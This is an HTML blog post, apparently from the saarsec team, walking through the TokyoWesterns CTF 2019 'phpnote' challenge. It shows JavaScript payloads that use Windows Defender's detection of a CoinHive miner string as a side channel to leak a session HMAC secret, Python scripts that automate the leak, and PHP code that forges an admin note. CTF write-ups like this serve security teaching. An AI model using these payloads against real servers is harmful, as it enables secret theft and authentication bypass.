@@ -1,0 +1,305 @@
+
+
+<!DOCTYPE html>
+<html lang="en-GB">
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>TokyoWesterns CTF 2019 - phpnote</title>
+  <meta name="description" content="Exploit Windows Defender as a side channel to leak a secret from the php session data">
+
+  <link rel="canonical" href="https://saarsec.rockshttps://saarsec.rocks/2019/09/04/twctf-phpnote.html">
+
+  <link rel="stylesheet" href="https://saarsec.rocks/static/css/bootstrap.min.css">
+  <!-- <link rel="stylesheet" href="https://saarsec.rocks/static/css/icard_resume.css"> -->
+  <!-- <link rel="stylesheet" href="https://saarsec.rocks/static/css/font-awesome.min.css"> -->
+  <link rel="stylesheet" href="https://saarsec.rocks/static/css/blog.css" >
+  <link rel="stylesheet" href="https://saarsec.rocks/static/css/syntax.css">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="https://saarsec.rocks/static/icon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://saarsec.rocks/static/icon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://saarsec.rocks/static/icon/favicon-16x16.png">
+  <link rel="manifest" href="/static/icon/site.webmanifest">
+  <link rel="mask-icon" href="/static/icon/safari-pinned-tab.svg" color="#000000">
+  <meta name="msapplication-TileColor" content="#ffffff">
+  <meta name="theme-color" content="#ffffff">
+
+
+  <!-- Google fonts -->
+  <link rel='stylesheet' href='//fonts.googleapis.com/css?family=Open+Sans:300' type='text/css'>
+  <link rel='stylesheet' href='//fonts.googleapis.com/css?family=Source+Sans+Pro' type='text/css'>
+</head>
+
+    <body>
+        
+<header class="bloghead">
+    <div class="authorheader">
+        <a href="https://saarsec.rocks"><img alt="Saarsec" title="Saarsec Logo" src="https://saarsec.rocks/static/img/saarsec.svg"/></a>
+        <div class="blogtitle">
+            <h1><a href="https://saarsec.rocks">saarsec</a></h1>
+            <h5> Schwenk and pwn </h5>
+        </div>
+    </div>
+
+    <nav class="menu" role="nav">
+        <ul>
+            <li><a href="https://saarsec.rocks">Home</a></li>
+            <li>|</li>
+            <li><a href="https://saarsec.rocks/archive.html">Archive</a></li>
+            <li>|</li>
+            <li><a href="https://saarsec.rocks/about.html">About</a></li>
+            <li>|</li>
+            <li><a href="https://saarsec.rocks/imprint.html">Imprint</a></li>
+        </ul>
+    </nav>
+</header>
+
+        <main class="blogmain">
+            
+                <header>
+                    <h1 class="article-title">TokyoWesterns CTF 2019 - phpnote</h1>
+                    <p class="article-info">
+                        04 September 2019 by alfink and Ben
+                    </p>
+                </header>
+            
+            <p>The main purpose of the service was to store and display serialized notes. However, the exploit requires more than a typical deserialisation exploit.</p>
+
+<p>This is, because the serialized note is signed using a HMAC and the deserialization is only triggered if the signature is valid. The HMACs secret is not known to the user, but stored in the session instead.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">verify</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$hmac</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$secret</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$secret</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">hash_equals</span><span class="p">(</span><span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$secret</span><span class="p">),</span> <span class="nv">$hmac</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cm">/* ... */</span>
+
+<span class="nv">$note</span> <span class="o">=</span> <span class="nx">verify</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;note&#39;</span><span class="p">],</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;hmac&#39;</span><span class="p">])</span>
+        <span class="o">?</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;note&#39;</span><span class="p">]))</span>
+        <span class="o">:</span> <span class="k">new</span> <span class="nx">Note</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span></code></pre></figure>
+
+<h2 id="guess-the-flag">Guess the Flag</h2>
+
+<p>During the CTF we looked for php issues and tried to bruteforce because <code>SALT</code> and <code>PEPPER</code> in the <code>gen_secret</code> function looked phishy (in php, <code>SALT</code> and <code>PEPPER</code> may default to the strings <code>"SALT"</code> and <code>"PEPPER"</code> if the constants are undefined). Also, it was possible to use an empty seed.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">gen_secret</span><span class="p">(</span><span class="nv">$seed</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nb">md5</span><span class="p">(</span><span class="nx">SALT</span> <span class="o">.</span> <span class="nv">$seed</span> <span class="o">.</span> <span class="nx">PEPPER</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span></code></pre></figure>
+
+<p>However, none of those ideas worked and the CTF passed by. :(</p>
+
+<h2 id="some-osint">Some OSINT</h2>
+
+<p>After the CTF, we found out that the challenge author was <a href="https://twitter.com/t0nk42">icchy</a>. For WCTF 2019, he already created a hard, but really creative challenge. To solve <a href="https://github.com/icchy/wctf2019-gtf"><em>Gyotaku The Flag</em></a>, it was required to leak the flag by using Windows Defender as a side channel (similar to the <a href="https://www.youtube.com/watch?v=HcrQy0C-hEA">XSS-Auditor side channel</a>). Unfortunately, there was an unintended solution that almost everyone exploited. Knowing that, it was only a matter of time for a similar challenge to appear.</p>
+
+<p>Thanks to all the people in the #twctf IRC for hinting on this after the CTF.</p>
+
+<h2 id="leaking-the-secret">Leaking the secret</h2>
+
+<p>After creating an account, <code>realname</code>, <code>secret</code> and <code>nickname</code> are stored in the session. The session data itself is stored in a file and looks like this:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><span></span>realname|s:11:&quot;Hello World&quot;;nickname|s:6:&quot;alfink&quot;;secret|s:32:&quot;13371337133713371337133713371337&quot;;</code></pre></figure>
+
+<p>Because the server is running Windows, Windows Defender inspects all files, including the ones that store the session data. So, if we store “malware” in the session data, Windows Defender detects it and the login will fail. One such string is <code>var miner=new CoinHive.User();miner.start()</code>.
+Another useful fact about Windows Defender is that it includes a Javascript Engine that executes all the Javascript code it finds. This should protect the users of obfuscated malware. However, this is also the part we will exploit to leak the secret.<br />
+As example, the first payload will be blocked by Windows Defender while the second will not:</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="kd">var</span> <span class="nx">mal</span> <span class="o">=</span> <span class="s1">&#39;var miner=new Coin&#39;</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="nx">mal</span> <span class="o">=</span> <span class="nx">mal</span> <span class="o">+</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">n</span><span class="o">^</span><span class="mi">40</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;ive.User();miner.start&#39;</span><span class="p">;</span>
+    <span class="nb">eval</span><span class="p">(</span><span class="nx">mal</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="kd">var</span> <span class="nx">mal</span> <span class="o">=</span> <span class="s1">&#39;var miner=new Coin&#39;</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="nx">mal</span> <span class="o">=</span> <span class="nx">mal</span> <span class="o">+</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">n</span><span class="o">^</span><span class="mi">65</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;ive.User();miner.start&#39;</span><span class="p">;</span>
+    <span class="nb">eval</span><span class="p">(</span><span class="nx">mal</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></code></pre></figure>
+
+<p>So, to leak the secret, we have to create a Javascript payload that reads a character of the secret, and only assembles our “malicious” string if it matches our guess. We can then use a successful login as our side channel output.</p>
+
+<h3 id="reading-the-secret-in-javascript">Reading the secret in Javascript</h3>
+
+<p>To read the secret in Javascript via <code>document.body.innerHTML</code>, it is necessary to put <code>&lt;body&gt;</code> tags around the secret. During registration <code>realname</code> and <code>nickname</code> are added to the session before <code>secret</code>, so we don’t control anything after the data to leak.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span></span><span class="x">if ($action === &#39;login&#39;) {</span>
+<span class="x">    if ($method === &#39;POST&#39;) {</span>
+<span class="x">        $nickname = (string)$_POST[&#39;nickname&#39;];</span>
+<span class="x">        $realname = (string)$_POST[&#39;realname&#39;];</span>
+
+<span class="x">        if (empty($realname) || strlen($realname) &lt; 8) {</span>
+<span class="x">            die(&#39;invalid name&#39;);</span>
+<span class="x">        }</span>
+
+<span class="x">        $_SESSION[&#39;realname&#39;] = $realname;</span>
+<span class="x">        if (!empty($nickname)) {</span>
+<span class="x">            $_SESSION[&#39;nickname&#39;] = $nickname;</span>
+<span class="x">        }</span>
+<span class="x">        $_SESSION[&#39;secret&#39;] = gen_secret($nickname);</span>
+<span class="x">    }</span>
+<span class="x">    redirect(&#39;index&#39;);</span>
+<span class="x">}</span></code></pre></figure>
+
+<p>But, we can execute this code again after the login. So, if no nickname is provided in the first request, only <code>realname</code> and <code>secret</code> are stored in the session. In all following login-requests, the <code>realname</code> and <code>secret</code> will be updated and a <code>nickname</code> is added to the end of the session file. This means, if we put a <code>&lt;body&gt;</code> into <code>realname</code> and <code>&lt;/body&gt;</code> into <code>nickname</code>, the secret is a substring of <code>document.body.innerHTML</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><span></span>realname|s:13:&quot;alfink &lt;body&gt;&quot;;secret|s:32:&quot;13371337133713371337133713371337&quot;;nickname|s:7:&quot;&lt;/body&gt;&quot;;</code></pre></figure>
+
+<p>So, our <code>nickname</code> will be <code>&lt;/body&gt;</code> and the <code>realname</code> our script (<code>{offset}</code> is the position of the char to leak and <code>{char_to_check}</code> the char to compare against):</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">mal</span> <span class="o">=</span> <span class="s1">&#39;var miner=new Coin&#39;</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">body</span><span class="p">[{</span><span class="nx">offset</span><span class="p">}].</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="nx">mal</span> <span class="o">=</span> <span class="nx">mal</span> <span class="o">+</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">n</span><span class="o">^</span><span class="p">{</span><span class="nx">char_to_check</span><span class="p">})</span><span class="o">+</span><span class="s1">&#39;ive.User();miner.start(&#39;</span><span class="p">;</span>
+    <span class="nb">eval</span><span class="p">(</span><span class="nx">mal</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">body</span><span class="p">&gt;</span></code></pre></figure>
+
+<h3 id="leaking-it-the-simple-way">Leaking it the simple way</h3>
+
+<p>The corresponding python code is the following:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="kn">import</span> <span class="nn">string</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+
+
+<span class="k">def</span> <span class="nf">oracle</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">nick</span> <span class="o">=</span> <span class="s2">&quot;&lt;/body&gt;&quot;</span>
+    <span class="n">realname</span> <span class="o">=</span> <span class="s2">&quot;alfink &quot;</span><span class="o">+</span><span class="n">data</span>
+
+    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+
+    <span class="k">assert</span> <span class="s2">&quot;alfink&quot;</span> <span class="ow">in</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;http://phpnote.chal.ctf.westerns.tokyo/?action=login&quot;</span><span class="p">,</span>
+                  <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;nickname&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;realname&quot;</span><span class="p">:</span> <span class="s2">&quot;alfink alfink&quot;</span><span class="p">})</span><span class="o">.</span><span class="n">content</span>
+
+    <span class="k">return</span> <span class="s2">&quot;alfink&quot;</span> <span class="ow">in</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;http://phpnote.chal.ctf.westerns.tokyo/?action=login&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;nickname&quot;</span><span class="p">:</span> <span class="n">nick</span><span class="p">,</span> <span class="s2">&quot;realname&quot;</span><span class="p">:</span> <span class="n">realname</span><span class="p">})</span><span class="o">.</span><span class="n">content</span>
+
+<span class="n">known</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">i2</span> <span class="ow">in</span> <span class="nb">set</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">ord</span><span class="p">,</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">))</span><span class="o">-</span><span class="nb">set</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">whitespace</span><span class="p">):</span>
+        <span class="n">i</span> <span class="o">=</span> <span class="n">i2</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;H&quot;</span><span class="p">)</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">oracle</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">        &lt;script&gt;var body = document.body.innerHTML;</span>
+<span class="s2">        var mal = &#39;var miner=new Coin&#39;;</span>
+<span class="s2">        var n = body[{}].charCodeAt(0);</span>
+<span class="s2">        mal = mal + String.fromCharCode(n^{}) + String.fromCharCode(n^{}) + String.fromCharCode(n^{}) + String.fromCharCode(n^{}) + String.fromCharCode(n^{}) +&#39;User();miner.start(&#39;;</span>
+<span class="s2">        eval(mal);</span>
+<span class="s2">        &lt;/script&gt;&lt;body&gt;&quot;&quot;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">known</span><span class="p">),</span> <span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;H&quot;</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;i&quot;</span><span class="p">),</span> <span class="n">i</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;H&quot;</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;v&quot;</span><span class="p">),</span> <span class="n">i</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;H&quot;</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;e&quot;</span><span class="p">),</span> <span class="n">i</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;H&quot;</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)))</span>
+        <span class="k">print</span> <span class="n">i</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;H&quot;</span><span class="p">))),</span> <span class="n">r</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">r</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;H&quot;</span><span class="p">):</span>
+                <span class="k">print</span> <span class="s2">&quot;=&gt;&quot;</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="n">known</span><span class="p">)</span>
+                <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+            <span class="n">known</span> <span class="o">=</span> <span class="n">known</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;H&#39;</span><span class="p">))</span>
+            <span class="k">print</span> <span class="s2">&quot;=&gt;&quot;</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="n">known</span><span class="p">)</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s2">&quot;=&gt;&quot;</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="n">known</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span></code></pre></figure>
+
+<p>I had to modify the javascript slightly to get rid of false positives, because Windows Defender seems to be case-insensitive.</p>
+
+<p>After some time, it returns the leaked part of the session:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><span></span>=&gt; &#39;&quot;;secret|s:32:&quot;2532bd172578d19923e5348420e02320&quot;;nickname|s:7:&quot;&#39;</code></pre></figure>
+
+<h3 id="bonus-the-fast-and-elegant-way">BONUS: The fast and elegant way</h3>
+
+<p>While I made my exploit faster by spending a few cents on a VPS in Tokyo, Ben implemented an exploit that used binary search to leak the secret more efficiently.</p>
+
+<p>His Javascript generates <code>CoinHive</code> if <code>test</code> was larger or equal to the character at offset <code>offset</code>. Otherwise it will assemble <code>Coinundefinedive</code>, which will not be detected. This approach has the advantage, that does not rely on case-sensitiveness.</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">mal</span> <span class="o">=</span> <span class="s1">&#39;var miner=new Coin&#39;</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">body</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">({</span><span class="nx">offset</span><span class="p">});</span>
+<span class="nx">mal</span> <span class="o">=</span> <span class="nx">mal</span> <span class="o">+</span> <span class="p">{{{</span><span class="nx">test</span><span class="p">}</span><span class="o">:</span> <span class="s1">&#39;H&#39;</span><span class="p">}}[</span><span class="nb">Math</span><span class="p">.</span><span class="nx">min</span><span class="p">({</span><span class="nx">test</span><span class="p">},</span> <span class="nx">n</span><span class="p">)]</span> <span class="o">+</span> <span class="s1">&#39;ive.User(); miner.start()&#39;</span><span class="p">;</span>
+<span class="nb">eval</span><span class="p">(</span><span class="nx">mal</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>x</code></pre></figure>
+
+<p>Ben’s python script uses the JS template for a binary search:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">template</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;attack.js&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+
+<span class="n">known_prefix</span> <span class="o">=</span> <span class="s1">&#39;x&quot;;secret|s:32:&quot;&#39;</span>
+
+<span class="k">def</span> <span class="nf">is_secret_less_than_guess</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">char</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">template</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="n">offset</span><span class="p">,</span> <span class="n">test</span><span class="o">=</span><span class="n">char</span><span class="p">)</span>
+    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;http://phpnote.chal.ctf.westerns.tokyo/?action=login&quot;</span><span class="p">,</span>
+                    <span class="p">{</span><span class="s2">&quot;realname&quot;</span><span class="p">:</span> <span class="s1">&#39;aaaaaaaa&#39;</span><span class="p">,</span> <span class="s2">&quot;nickname&quot;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">})</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;http://phpnote.chal.ctf.westerns.tokyo/?action=login&quot;</span><span class="p">,</span>
+                 <span class="p">{</span><span class="s2">&quot;realname&quot;</span><span class="p">:</span> <span class="s1">&#39;aaaaaaaa&#39;</span><span class="p">,</span> <span class="s2">&quot;nickname&quot;</span><span class="p">:</span> <span class="s1">&#39;&lt;/body&gt;&#39;</span><span class="p">})</span>
+
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;http://phpnote.chal.ctf.westerns.tokyo/?action=login&quot;</span><span class="p">,</span>
+                        <span class="p">{</span><span class="s2">&quot;realname&quot;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span> <span class="s2">&quot;nickname&quot;</span><span class="p">:</span> <span class="s1">&#39;&lt;/body&gt;&#39;</span><span class="p">})</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1376</span><span class="p">:</span> <span class="c1"># blocked response, means c == n or c &gt; n</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">True</span>
+
+
+<span class="k">def</span> <span class="nf">search</span><span class="p">(</span><span class="n">offset</span><span class="p">):</span>
+    <span class="n">low</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">high</span> <span class="o">=</span> <span class="mi">256</span>
+    <span class="k">while</span> <span class="n">low</span> <span class="o">&lt;=</span> <span class="n">high</span><span class="p">:</span>
+        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
+        <span class="n">guess</span> <span class="o">=</span> <span class="n">is_secret_less_than_guess</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">guess</span><span class="p">:</span>
+            <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span>
+        <span class="k">if</span> <span class="n">high</span> <span class="o">-</span> <span class="n">low</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">low</span>
+
+<span class="n">result</span> <span class="o">=</span> <span class="n">known_prefix</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">known_prefix</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">known_prefix</span><span class="p">)</span> <span class="o">+</span> <span class="mi">32</span><span class="p">):</span>
+    <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">search</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+<span class="k">print</span> <span class="n">result</span></code></pre></figure>
+
+<h2 id="request-the-flag">Request the flag</h2>
+
+<p>Finally, we can use the leaked secret to sign a note with <code>isadmin</code> set:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$secret</span> <span class="o">=</span> <span class="s2">&quot;2532bd172578d19923e5348420e02320&quot;</span><span class="p">;</span>
+<span class="nv">$note</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Note</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+<span class="nv">$note</span><span class="o">-&gt;</span><span class="na">addnote</span><span class="p">(</span><span class="s2">&quot;exploit&quot;</span><span class="p">,</span><span class="s2">&quot;works&quot;</span><span class="p">);</span>
+<span class="nv">$data</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$note</span><span class="p">));</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+<span class="nv">$hmac</span> <span class="o">=</span> <span class="nx">hmac</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$secret</span><span class="p">);</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$hmac</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span></code></pre></figure>
+
+<p>Setting the cookies and accessing http://phpnote.chal.ctf.westerns.tokyo/?action=getflag reveals the flag: <code>TWCTF{h0pefully_I_haven't_made_a_m1stake_again}</code></p>
+
+        </main>
+        
+<div class="footer">
+    <div class="container-fluid">
+        <div class="row-fluid">
+            <div class="col-md-12">
+            </div>
+        </div>
+    </div>
+</div>
+<script type="text/javascript" src="/static/js/jquery.min.js"></script>
+<script type="text/javascript" src="/static/js/bootstrap.min.js"></script>
+
+    </body>
+
+</html>
